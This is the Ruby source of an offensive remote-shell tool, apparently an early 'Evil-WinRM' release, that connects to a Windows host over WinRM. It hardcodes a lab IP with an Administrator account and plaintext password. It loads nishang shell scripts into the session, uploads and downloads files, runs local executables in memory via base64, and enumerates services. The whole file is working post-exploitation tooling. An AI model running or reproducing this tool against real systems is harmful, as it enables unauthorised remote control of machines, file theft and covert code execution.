#!/usr/bin/ruby
# -*- encoding : utf-8 -*-
require 'winrm'
require 'winrm-fs'
require 'base64'
require 'readline'
require 'stringio'
require 'colorize'

# Constants
TYPE_INFO = 0
TYPE_ERROR = 1
TYPE_WARNING = 2
TYPE_DATA = 3
SCRIPT_VERSION = '1.4'

# Global vars
# Set this to false to disable colors
$colors_enabled = true
# Set the path for your scripts (ps1 files) and your executables (exe files)
$scripts_path = "/opt/windows/nishang/Shells/"
$executables_path = "/usr/share/windows-resources/binaries/"

# Connection parameters, set your ip address or hostname, your user and password
conn = WinRM::Connection.new(
    endpoint: 'http://10.10.10.149:5985/wsman',
    user: 'Administrator',
    password: '4dD!5}x/re8]FBuZ',
    :no_ssl_peer_verification => true,
    # Below, config for SSL, uncomment if needed and set cert files
    # transport: :ssl,
    # client_cert: 'certnew.cer',
    # client_key: 'client.key',
)

file_manager = WinRM::FS::FileManager.new(conn)

def colorize(text, color = "default")
    colors = {"default" => "38", "blue" => "34", "red" => "31", "yellow" => "1;33", "magenta" => "35"}
    color_code = colors[color]
    return "\033[0;#{color_code}m#{text}\033[0m"
end

def print_message(msg, msg_type)
    if msg_type == TYPE_INFO then
        msg_prefix = "Info: "
        color = "blue"
    elsif msg_type == TYPE_WARNING then
        msg_prefix = "Warning: "
        color = "yellow"
    elsif msg_type == TYPE_ERROR then
        msg_prefix = "Error: "
        color = "red"
    elsif msg_type == TYPE_DATA then
        msg_prefix = "Data: "
        color = 'magenta'
    else
        msg_prefix = "Error"
        color = "red"
    end

    if $colors_enabled then
        puts("#{colorize(msg_prefix + msg, color)}")
    else
        puts(msg_prefix + msg)
    end
    puts()
end

def check_directories(path, purpose)
    if path == "" then
        print_message("The directory used for " + purpose + " can't be empty. Please edit the script and set a path", TYPE_ERROR)
        custom_exit(1)
    end

    if (/cygwin|mswin|mingw|bccwin|wince|emx/ =~ RUBY_PLATFORM) != nil then
        # Windows
        if path[-1] != "\\" then
            path.concat("\\")
        end
    else
        # Unix
        if path[-1] != "/" then
            path.concat("/")
        end
    end

    if !File.directory?(path) then
        print_message("The directory \"" + path + "\" used for " + purpose + " was not found", TYPE_ERROR)
        custom_exit(1)
    end

    if purpose == "scripts" then
        $scripts_path = path
    elsif purpose == "executables" then
        $executables_path = path
    end
end

def silent_warnings
    old_stderr = $stderr
    $stderr = StringIO.new
    yield
ensure
    $stderr = old_stderr
end

def read_scripts(scripts)
    files = Dir.entries(scripts).select{ |f| File.file? File.join(scripts, f) }
    return files
end

def read_executables(args)
    executables = args
    files = Dir.glob("#{executables}*.exe", File::FNM_DOTMATCH)
    return files
end

def paths(directory)
    files = Dir.glob("#{directory}*.*", File::FNM_DOTMATCH)
    directories = Dir.glob("#{directory}*").select {|f| File.directory? f}
    return files + directories
end

def custom_exit(exit_code = 0)
    if exit_code == 0 then
        puts()
        print_message("Exiting with code " + exit_code.to_s, TYPE_INFO)
    elsif exit_code == 1 then
        print_message("Exiting with code " + exit_code.to_s, TYPE_ERROR)
    else
        print_message("Exiting with code " + exit_code.to_s, TYPE_ERROR)
    end
    exit(exit_code)
end

puts()
print_message("Starting Evil-WinRM shell v" + SCRIPT_VERSION, TYPE_INFO)
check_directories($scripts_path, "scripts")
check_directories($executables_path, "executables")
functions = read_scripts($scripts_path)
executables = read_executables($executables_path)
menu = Base64.decode64("")

class String def tokenize
    self.
        split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
        select {|s| not s.empty? }.
        map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
    end
end

LIST = ['upload', 'download', 'exit', 'menu', 'services'].sort

silent_warnings do
    LIST = LIST + functions
end

completion = 
    proc do |str|
      case
      when Readline.line_buffer =~ /help.*/i
        puts("#{LIST.join("\t")}")
      when Readline.line_buffer =~ /Invoke-Binary.*/i
        executables.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
      when Readline.line_buffer =~ /upload.*/i
        paths = paths(str)
        paths.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
      else 
        LIST.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
      end
    end

Readline.completion_proc = completion       
Readline.completion_append_character = '' 

command = ""

begin
    print_message("Establishing connection to remote endpoint", TYPE_INFO)
    conn.shell(:powershell) do |shell|
        until command == "exit" do

            pwd = shell.run("(get-location).path").output.strip
            command = Readline.readline("*Evil-WinRM*".red + " PS ".yellow + pwd + "> ", true) # True for command history

            if command.start_with?('upload') then
                upload_command = command.tokenize
                command = ""

                # If the file to upload exists in current dir, is not needed to set upload name, otherwise must be done
                if upload_command[2].to_s.empty? then upload_command[2] = "." end
                begin
                    print_message("Uploading " + upload_command[1] + " to " + upload_command[2], TYPE_INFO)
                    file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes|
                    print_message("#{bytes_copied} bytes of #{total_bytes} bytes copied", TYPE_DATA)
                    print_message("Upload successful!", TYPE_INFO)
                  end
                rescue
                    print_message("Upload failed. Check file names", TYPE_ERROR)
                end

            elsif command.start_with?('download') then
                download_command = command.tokenize
                command = ""

                # If the file to download exists in current dir, is not needed to set download name, otherwise must be done
                if download_command[2].to_s.empty? then download_command[2] = download_command[1] end
                begin
                    print_message("Downloading " + download_command[1] + " to " + download_command[2], TYPE_INFO)
                    file_manager.download(download_command[1], download_command[2])
                    print_message("Download successful!", TYPE_INFO)
                rescue
                    print_message("Download failed. Check file names", TYPE_ERROR)
                end

            elsif command.start_with?('Invoke-Binary') then
                begin
                    invoke_Binary = command.tokenize
                    command = ""
                    load_executable = invoke_Binary[1]
                    load_executable = File.binread(load_executable)
                    load_executable = Base64.strict_encode64(load_executable)

                    if !invoke_Binary[4].to_s.empty? && invoke_Binary[5].to_s.empty?
                        output = shell.run("Invoke-Binary " + load_executable + "," + invoke_Binary[2] + "," + invoke_Binary[3] + "," + invoke_Binary[4])
                    elsif !invoke_Binary[3].to_s.empty? && invoke_Binary[4].to_s.empty?
                        output = shell.run("Invoke-Binary " + load_executable + "," + invoke_Binary[2] + "," + invoke_Binary[3])
                    elsif !invoke_Binary[2].to_s.empty? && invoke_Binary[3].to_s.empty?
                        output = shell.run("Invoke-Binary " + load_executable + "," + invoke_Binary[2])
                    elsif invoke_Binary[2].to_s.empty?
                        output = shell.run("Invoke-Binary " + load_executable)
                    end
                    print(output.output)
                rescue
                    print_message("Check file names", TYPE_ERROR)
                end

            elsif command.start_with?('services') then
                command = ""
                output = shell.run('Get-ItemProperty "registry::HKLM\System\CurrentControlSet\Services\*" | Where-Object {$_.imagepath -notmatch "system" -and $_.imagepath -ne $null } | Select-Object pschildname,imagepath | fl')
                print(output.output.chomp)

            elsif command.start_with?(*functions) then
                silent_warnings do
                    load_script = $scripts_path + command
                    command = ""
                    load_script = load_script.gsub(" ","")
                    load_script = File.binread(load_script)
                    output = shell.run(load_script)
                end

            elsif command.start_with?('menu') then
                command = ""
                silent_warnings do
                    output = shell.run(menu)
                    output = shell.run("Menu")
                    autocomplete = shell.run("auto").output.chomp
                    autocomplete = autocomplete.gsub!(/\r\n?/, "\n")
                    LIST2 = autocomplete.split("\n")
                    LIST = LIST + LIST2
                    print(output.output)
                end
            end

            output = shell.run(command) do |stdout, stderr|
                STDOUT.print(stdout)
                STDERR.print(stderr)
            end
        end

        custom_exit(0)
    end
rescue
    print_message("Can't establish connection. Check connection params", TYPE_ERROR)
    custom_exit(1)
end
